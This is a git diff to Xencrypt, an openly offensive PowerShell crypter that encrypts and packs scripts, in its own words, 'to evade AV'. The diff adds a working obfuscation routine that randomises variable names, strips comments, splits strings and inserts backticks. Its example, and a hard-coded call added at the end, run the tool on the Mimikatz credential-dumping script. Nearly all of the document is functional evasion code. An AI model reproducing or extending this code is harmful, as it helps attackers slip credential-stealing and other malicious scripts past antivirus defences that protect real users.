@@ -1,4 +1,4 @@
-﻿#    Xencrypt - PowerShell crypter
+﻿#    Xencrypt - Powershell crypter
 #    Copyright (C) 2020 Xentropy ( @SamuelAnttila )
 #
 #    This program is free software: you can redistribute it and/or modify
@@ -25,36 +25,193 @@ function Create-Var() {
         (1..(4 + (Get-Random -Maximum 6)) | %{ $set[(Get-Random -Minimum 0 -Maximum $set.Length)] } ) -join ''
 }
 
+
+function Generate-HighEntropy-VarName {
+    #Gotta avoid curly braces, colons and backticks
+    '{' + -join((9,10,13) + (32..57) + (59..95) + (97..122) | Get-Random -Count (Get-Random -Minimum 5 -Maximum 20) | % {[char]$_}) + '}'
+}
+
+function Generate-LowEntropy-VarName {
+    -join((48..57) + (97..122) + (65..90) | Get-Random -Count (Get-Random -Minimum 5 -Maximum 20) | % {[char]$_})
+}
+
+
+function Invoke-Xobfuscation {
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
+        [string] $code = $(Throw("-code is required"))
+    )
+    $tokens = $null
+    $errors = $null
+
+    #Variables that probably shouldn't be changed...
+    $blacklistVariables = @('$$','$?','$^','$_','$args','$consolefilename','$error','$event','$eventargs','$eventsubscriber','$executioncontext','$false','$foreach','$home','$host','$input','$iscoreclr','$ismacos','$islinux','$iswindows','$lastexitcode','$matches','$myinvocation','$nestedpromptlevel','$null','$pid','$profile','$psboundparameters','$pscmdlet','$pscommandpath','$psculture','$psdebugcontext','$pshome','$psitem','$psscriptroot','$pssenderinfo','$psuiculture','$psversiontable','$pwd','$sender','$sender','$shellid','$stacktrace','$switch','$this','$true')
+
+    $ast = [System.Management.Automation.Language.Parser]::ParseInput($code, [ref] $tokens, [ref] $errors)
+
+    #To track old -> new variable names
+    $variableTracking = @{}
+    #As we change vars, offsets will shift by this amount
+
+    #Characters that should never be escaped with backtics
+    $charBlackList = @('t','n','r','a','v','f','b','0',"'",'"','`')
+
+    $accumulatedOffset = 0
+    $progress=1
+
+    foreach ($token in $tokens){
+        
+        Write-Progress -Id 0 -Activity "Obfuscating..." -Status "Progress: $progress/$($tokens.count)" -PercentComplete ($progress/$tokens.count*100)
+
+        $start = $token.Extent.StartOffset+$accumulatedOffset
+        $end = $token.Extent.EndOffset+$accumulatedOffset-1
+        #Variable obfuscation
+        
+        if($token.Kind -eq 'Variable'){
+            #certain variables should not be randomized
+            if(!$blacklistVariables.Contains($token.Extent.Text.ToLower())) {  
+                if(!$variableTracking.Contains($token.Name)) {
+                    # Save new var name mapped to old one
+                    #Combine high and low level entropy variable names.
+                    if ((Get-Random -Minimum 0 -Maximum 2) -eq 1) {
+                        $randVar = Generate-HighEntropy-VarName
+                    } else {
+                        $randVar = Generate-LowEntropy-VarName
+                    }
+                    $variableTracking.Add($token.Name,$randVar)
+
+                    #replace old with new
+                    $code = $code.Remove($start+1, $end-$start).Insert($start+1, $randVar)
+                    $accumulatedOffset += $randVar.Length-$token.Name.length
+                } else {
+                    #if a var has already been assgined a new random name, use that one rather than generating a new one
+                    $randVar = $variableTracking[$token.Name]
+                    $code = $code.Remove($start+1, $end-$start).Insert($start+1, $randVar)
+                    $accumulatedOffset += $randVar.Length-$token.Name.length
+                }
+            }
+        } elseif ($token.Kind -eq "Comment") {
+            # strip all comments without mercy
+            $code = $code.Remove($start, $end-$start+1)
+            $accumulatedOffset -= $token.Extent.Text.Length
+        } elseif ($token.Kind -eq "StringLiteral") {
+            #insert random string delimiters
+            $outputStr = ''
+            if ($token.Extent.Text.Length -lt 500) {
+                for($i=$start;$i -le $end; $i++){
+                    #30% chance
+                    if ((Get-Random -Maximum 11 -Minimum 1) -ge 7 -and $i -gt $start -and $i -lt $end) {
+                        $outputStr += "'+'"+$code[$i] 
+                    } else {
+                        $outputStr += $code[$i] 
+                    }
+                }
+                
+                $code = $code.Remove($start, $end-$start+1).Insert($start, $outputStr)
+                $accumulatedOffset += $outputStr.Length-$token.Extent.Text.Length
+            } else {
+                #long stringprocessing
+                for($i=$start;$i -le $end; $i+= (Get-Random -Minimum 10 -Maximum 100)){
+                    if (!$charBlackList.Contains([string]$code[$i]) -and $i -gt $start -and $i -lt $end) {
+                        $code = $code.Insert($start, "'+'")
+                        $accumulatedOffset += 3
+                    }  
+                    Write-Progress -Id 1 -ParentId 0 -Activity "Processing long string..." -Status "Progress: $($i-$start)/$($end-$start)" -PercentComplete (($i-$start)/($end-$start)*100)
+                }
+            }
+        } elseif ($token.Kind -eq "StringExpandable") {
+            #double quotes (expandable)
+            #backtics
+            $outputStr = ''
+            if ($token.Extent.Text.Length -lt 500) {
+                for($i=$start;$i -le $end; $i++){
+                    if ((Get-Random -Maximum 2 -Minimum 0) -eq 1 -and !$charBlackList.Contains([string]$code[$i])  -and $i -gt $start -and $i -lt $end ) {
+                        $outputStr += '`'+$code[$i] 
+                    } else {
+                        $outputStr += $code[$i] 
+                    }
+                   
+                }
+                $code = $code.Remove($start, $end-$start+1).Insert($start, $outputStr)
+                $accumulatedOffset += $outputStr.Length-$token.Extent.Text.Length
+                
+            } else {
+                #long string processing
+                for($i=$start;$i -le $end; $i+= (Get-Random -Minimum 10 -Maximum 100)){
+                    if (!$charBlackList.Contains([string]$code[$i]) -and $i -gt $start -and $i -lt $end) {
+                        $code = $code.Insert($start, '`')
+                        $accumulatedOffset += 1 
+                    }  
+                }
+                Write-Progress -Id 1 -ParentId 0 -Activity "Processing long string..." -Status "Progress: ($i-$start)/$($end-$start)" -PercentComplete (($i-$start)/$($end-$start)*100)
+                
+                
+            }
+        } elseif ($token.Kind -eq 'Generic') {
+            #backtics
+            $outputStr = ''
+            for($i=$start;$i -le $end; $i++){
+                if ((Get-Random -Maximum 3 -Minimum 0) -ge 1 -and !$charBlackList.Contains([string]$code[$i])) {
+                    #Backtic
+                    # We need to check if the case randomization would cause issues with special escape sequences.
+                    if((Get-Random -Maximum 2 -Minimum 0) -eq 1 -and !$charBlackList.Contains(([string]$code[$i]).ToLower())) {
+                        $outputStr += '`'+([string]$code[$i]).ToLower()
+                    } else {
+                        $outputStr += '`'+([string]$code[$i]).ToUpper()
+                    }
+                } else {
+                    #no backtic
+                    if((Get-Random -Maximum 2 -Minimum 0) -eq 1 ) {
+                        $outputStr += ([string]$code[$i]).ToLower()
+                    } else {
+                        $outputStr += ([string]$code[$i]).ToUpper()
+                    }
+                }
+            }
+            $code = $code.Remove($start, $end-$start+1).Insert($start, $outputStr)
+            $accumulatedOffset += $outputStr.Length-$token.Extent.Text.Length
+        } elseif ( $token.Kind -eq 'Identifier' ) {
+            #backtics
+            $outputStr = ''
+            for($i=$start;$i -le $end; $i++){
+                # No backticks in identifiers
+                if((Get-Random -Maximum 2 -Minimum 0) -eq 1 ) {
+                    $outputStr += ([string]$code[$i]).ToLower()
+                } else {
+                    $outputStr += ([string]$code[$i]).ToUpper()
+                }
+            }
+            $code = $code.Remove($start, $end-$start+1).Insert($start, $outputStr)
+            $accumulatedOffset += $outputStr.Length-$token.Extent.Text.Length
+             
+        }
+        $progress += 1
+    }
+    $code
+}
+
+
 function Invoke-Xencrypt {
-    <#
+ <#
     .SYNOPSIS
-
     Invoke-Xencrypt takes any PowerShell script as an input and both packs and encrypts it to evade AV. It also lets you layer this recursively however many times you want in order to foil dynamic & heuristic detection.
-
     .DESCRIPTION
-
      Invoke-Xencrypt takes any PowerShell script as an input and both packs and encrypts it to evade AV. 
      The output script is highly randomized in order to make static analysis even more difficut.
      It also lets you layer this recursively however many times you want in order to attempt to foil dynamic & heuristic detection.
-
-
     .PARAMETER InFile
     Specifies the script to obfuscate/encrypt.
-
     .PARAMETER OutFile
     Specifies the output script.
-
     .PARAMETER Iterations
     The number of times the PowerShell script will be packed & crypted recursively. Default is 2.
-
+    .PARAMETER SkipObfuscation
+    If specified, skips the default obfuscation step. Mostly useful if your input script is already obfuscated or unlikely to get flagged during dynamic execution.
     .EXAMPLE
-
-    PS> Invoke-Xencrypt -InFile Invoke-Mimikatz.ps1 -OutFile banana.ps1 -Iterations 3
-
+    PS> Invoke-Xencrypt -InFile Mimikatz.ps1 -OutFile banana.ps1 -Iterations 3
     .LINK
-
     https://github.com/the-xentropy/xencrypt
-
     #>
 
     [CmdletBinding()]
@@ -64,21 +221,30 @@ function Invoke-Xencrypt {
         [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
         [string] $outfile = $(Throw("-OutFile is required")),
         [Parameter(Mandatory=$false,ValueFromPipeline,ValueFromPipelineByPropertyName)]
-        [string] $iterations = 2
+        [switch] $skipObfuscation = $false,
+        [Parameter(Mandatory=$false,ValueFromPipeline,ValueFromPipelineByPropertyName)]
+        [string] $iterations = 1
     )
     Process {
         Write-Output "
-Xencrypt  Copyright (C) 2020  Xentropy ( @SamuelAnttila )
-This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
+Xencrypt Copyright (C) 2020 Xentropy ( @SamuelAnttila )
+This program comes with ABSOLUTELY NO WARRANTY!
 This is free software, and you are welcome to redistribute it
 under certain conditions.
 "
 
         # read
-        Write-Output "[*] Reading '$($infile)' ..."
-        $codebytes = [System.IO.File]::ReadAllBytes($infile)
+        if (!$skipObfuscation) {
+            Write-Output "[*] Reading '$($infile)' ..."
+            $code = [System.IO.File]::ReadAllText($infile)
 
-
+            Write-Output "[*] Obfuscating input script (This can take a while) ..."
+            $obfcode = [string](Invoke-Xobfuscation -code $code)
+  
+            $codebytes = [system.Text.Encoding]::UTF8.GetBytes($obfcode)
+        } else {
+            $codebytes = [System.IO.File]::ReadAllBytes($infile)
+        }
         for ($i = 1; $i -le $iterations; $i++) {
             # Decide on encryption params ahead of time 
             
@@ -196,3 +362,4 @@ under certain conditions.
         Write-Output "[+] Done!"
     }
 }
+Invoke-Xencrypt C:\Users\Sam\Desktop\xencrypt\Invoke-Mim`ikatz.ps1 C:\tools\banana.ps1
